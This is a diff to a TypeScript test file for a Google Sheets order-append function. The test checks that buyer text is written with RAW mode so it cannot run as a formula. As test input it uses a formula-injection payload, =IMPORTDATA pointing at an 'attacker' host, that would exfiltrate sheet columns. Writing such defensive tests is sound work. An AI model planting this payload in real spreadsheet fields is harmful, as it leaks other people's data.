@@ -1,5 +1,17 @@
-import { describe, it, expect } from "vitest";
+import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
 import { buildSheetRow, type OrderRowInput } from "@/lib/sheets";
+
+// Short-circuit the service-account JWT so the test exercises only the append
+// request shape, not the credential flow. Mirrors sheets-read.test.ts.
+vi.mock("google-auth-library", () => {
+  class FakeJWT {
+    constructor(_opts: unknown) {}
+    async getAccessToken() {
+      return { token: "fake-token" };
+    }
+  }
+  return { JWT: FakeJWT };
+});
 
 const base: OrderRowInput = {
   orderNumber: "NAG-20260521-A7K1",
@@ -37,5 +49,47 @@ describe("buildSheetRow", () => {
   it("writes 'Confirmed on call' when shipping is not shown", () => {
     const row = buildSheetRow({ ...base, shipping: { showFee: false, shippingCentavos: 0 } });
     expect(row[12]).toBe("Confirmed on call");
+  });
+});
+
+describe("appendOrderRow — formula/CSV injection guard", () => {
+  beforeEach(() => {
+    vi.stubEnv("GOOGLE_SHEET_ID", "sheet-id-stub");
+    vi.stubEnv("GOOGLE_SERVICE_ACCOUNT_EMAIL", "stub@example.com");
+    vi.stubEnv("GOOGLE_PRIVATE_KEY", "stub-key");
+  });
+
+  afterEach(() => {
+    vi.unstubAllEnvs();
+    vi.unstubAllGlobals();
+    vi.restoreAllMocks();
+  });
+
+  it("appends with valueInputOption=RAW so buyer text is never evaluated as a formula", async () => {
+    const fetchMock = vi.fn<(url: string, init?: RequestInit) => Promise<Response>>(
+      async () =>
+        new Response(JSON.stringify({ updates: { updatedRows: 1 } }), {
+          status: 200,
+          headers: { "content-type": "application/json" },
+        })
+    );
+    vi.stubGlobal("fetch", fetchMock);
+
+    const { appendOrderRow } = await import("@/lib/sheets");
+    // A name field carrying the IMPORTDATA exfil payload from the threat model.
+    const row = buildSheetRow({
+      ...base,
+      name: '=IMPORTDATA("https://attacker/?d="&A:Q)',
+    });
+    await appendOrderRow(row);
+
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+    const url = fetchMock.mock.calls[0][0];
+    // The injection-prone mode must be gone and stay gone.
+    expect(url).toContain("valueInputOption=RAW");
+    expect(url).not.toContain("USER_ENTERED");
+    // The payload is still sent verbatim — RAW stores it as inert text, not a formula.
+    const body = JSON.parse((fetchMock.mock.calls[0][1] as RequestInit).body as string);
+    expect(body.values[0][2]).toBe('=IMPORTDATA("https://attacker/?d="&A:Q)');
   });
 });
